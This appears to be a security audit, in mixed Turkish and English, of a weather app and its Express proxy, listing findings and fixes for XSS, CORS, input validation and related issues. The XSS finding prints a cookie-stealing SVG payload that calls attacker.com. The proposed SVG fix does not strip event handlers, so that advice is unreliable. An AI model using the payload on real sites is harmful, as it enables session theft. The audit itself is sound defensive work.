# SECURITY AUDIT: Weather App (Browser + Proxy)

**Risk Assessment:** Medium (Client: Low-Medium | Server: Medium)

---

## 1. Findings (Bulgular)

### DOM-based XSS via innerHTML (SVG Icons)

* **Severity:** Medium
* **Location:** `app.js` line 102 — `iconEl.innerHTML = svg`
* **The Exploit:** SVG icon string, eğer upstream API'dan kötü niyetle manipüle edilirse veya Man-in-the-Middle saldırısında değiştirilirse, tarayıcıda arbitrary script çalıştırılabilir. Örneğin: `<svg onload="fetch('https://attacker.com?data=' + document.cookie)"></svg>`
* **The Fix:**
```javascript
// SVG'yi innerHTML yerine DOMParser + safe insertion kullanın
function setSvgIcon(svg){
  try{
    const parser = new DOMParser()
    const doc = parser.parseFromString(svg, 'image/svg+xml')
    if(doc.getElementsByTagName('parsererror').length) throw new Error('Invalid SVG')
    iconEl.innerHTML = ''
    const svgElement = doc.documentElement
    const imported = document.importNode(svgElement, true)
    iconEl.appendChild(imported)
  }catch(e){
    console.warn('Invalid SVG icon, using fallback')
    iconEl.textContent = '◯'
  }
}
// app.js line 102'de: setSvgIcon(svg) çağır
```

---

### Unvalidated Numeric Parameters (Latitude/Longitude)

* **Severity:** Medium
* **Location:** `server.js` line 48-49 (weather endpoint)
* **The Exploit:** lat/lon parametreleri doğrulanmıyor. Saldırgan çok büyük string veya özel karakterler göndererek cache poisoning, DoS veya upstream API'yı manipüle edebilir.
* **The Fix:**
```javascript
// server.js — validateCoordinates helper ekle
function validateCoordinates(lat, lon){
  const latNum = parseFloat(lat)
  const lonNum = parseFloat(lon)
  if(isNaN(latNum) || isNaN(lonNum) || latNum < -90 || latNum > 90 || lonNum < -180 || lonNum > 180){
    return null
  }
  return {lat: latNum, lon: lonNum}
}

app.get('/api/weather', async (req, res) => {
  const coords = validateCoordinates(req.query.latitude, req.query.longitude)
  if (!coords) return res.status(400).json({error: 'Invalid coordinates'})
  const cacheKey = `weather:${coords.lat},${coords.lon}`
  // ... rest remains same
})
```

---

### Open CORS (credential-less but overly permissive)

* **Severity:** Low-Medium
* **Location:** `server.js` line 25 — `app.use(cors())`
* **The Exploit:** Herhangi bir domain, tarayıcıdan proxy'e istek gönderebilir. CSRF riski düşük (state-changing op yok), ancak DoS/API throttle saldırısı için abuse edilebilir.
* **The Fix:**
```javascript
// server.js
const allowedOrigins = (process.env.ALLOWED_ORIGINS || 'http://localhost:3000,http://localhost:8000').split(',')
app.use(cors({
  origin: (origin, callback) => {
    if (!origin || allowedOrigins.includes(origin)) callback(null, true)
    else callback(new Error('CORS not allowed'))
  }
}))
```

---

### Information Disclosure in Error Responses

* **Severity:** Low
* **Location:** `server.js` line 59, 80 — upstream error status açığa çıkması
* **The Exploit:** Saldırgan upstream API'nın implementation detaylarını, rate-limit durumunu vs. öğrenebilir.
* **The Fix:**
```javascript
// server.js
catch(e){
  console.error('Weather proxy error:', e.message) // Log ediyor
  res.status(502).json({error: 'Service temporarily unavailable'}) // Generic message
}
```

---

### IP Detection Behind Proxy (Rate Limiting Bypass)

* **Severity:** Low
* **Location:** `server.js` line 31 — `req.ip` proxy arkasında sorun yaratabilir
* **The Exploit:** Load balancer/reverse proxy arkasında çalışıyorsa tüm istekler aynı IP'den gelir.
* **The Fix:**
```javascript
// server.js
app.set('trust proxy', process.env.TRUST_PROXY || 1)
// Şimdi req.ip X-Forwarded-For kullanacak
```

---

### Static Files Served Without Restrictions

* **Severity:** Low
* **Location:** `server.js` line 26 — `app.use(express.static(path.join(__dirname)))`
* **The Exploit:** `package.json`, `workbox-config.js` gibi configuration dosyaları HTTP'den erişilebilir.
* **The Fix:**
```javascript
// server.js
const staticOptions = {
  dotfiles: 'deny',
  index: false
}
// Sadece state files servis et
app.use(express.static(path.join(__dirname, 'public'), staticOptions))
// Veya sensitive files'ları .gitignore'a ekle ve public/ klasörüne taşı
```

---

### No HTTPS Enforcement (Production Risk)

* **Severity:** Medium (prod only)
* **Location:** Both `server.js` and client
* **The Exploit:** Plain HTTP trafiği Man-in-the-Middle saldırısına açık.
* **The Fix:**
```javascript
// server.js — production'da HTTPS enforce et
if (process.env.NODE_ENV === 'production'){
  app.use((req, res, next) => {
    if (req.header('x-forwarded-proto') !== 'https') {
      return res.redirect(301, `https://${req.header('host')}${req.url}`)
    }
    res.setHeader('Strict-Transport-Security', 'max-age=31536000; includeSubDomains')
    next()
  })
}
```

---

## 2. Observations (Gözlemler)

* **Dependency Vulnerabilities:** `npm audit` çalıştırıp patching yapın.
* **No .env file:** Üretim secrets (ALLOWED_ORIGINS, NODE_ENV, PORT) için `.env` oluşturup `.gitignore`'a ekleyin.
* **CSP Meta Tag:** Hardcoded `localhost:3000` — production'da dinamik hale getirin.
* **Service Worker CDN Risk:** Workbox'ı workbox-cdn'den load etmek third-party dep oluşturur. Build-time precache tercih edin.
* **Logging:** Sensitive bilgiler log'lanmıyor—iyi.

---

## 3. Critical Secrets Checklist

* [x] API Keys: NONE (Open-Meteo public)
* [x] Database Credentials: NONE
* [x] RSA/SSH Keys: NONE
* [x] Passwords: NONE
* [ ] .env file: oluşturulmalı

---

## 4. Recommended Fix Priority

| Priority | Issue | Effort | Impact |
|----------|-------|--------|--------|
| **Critical** | Validate lat/lon | 5 min | High |
| **High** | Fix SVG XSS | 10 min | High |
| **High** | CORS whitelist | 5 min | Medium |
| **Medium** | Trust proxy header | 5 min | Medium |
| **Low** | Restrict static files | 10 min | Low |
| **Low** | Error disclosure | 5 min | Low |
| **Low** | HTTPS (prod) | 10 min | High (prod) |

---

## 5. Status

✅ **Secure:**
- Timeout'lu fetch calls
- Basic input validation
- DOM element safe access
- Error handling
- Rate limiting

❌ **Critical/High Fixes Required:**
1. SVG innerHTML XSS (HIGH)
2. Numeric parameter validation (CRITICAL)
3. CORS whitelist (HIGH)
4. Trust proxy header (MEDIUM)

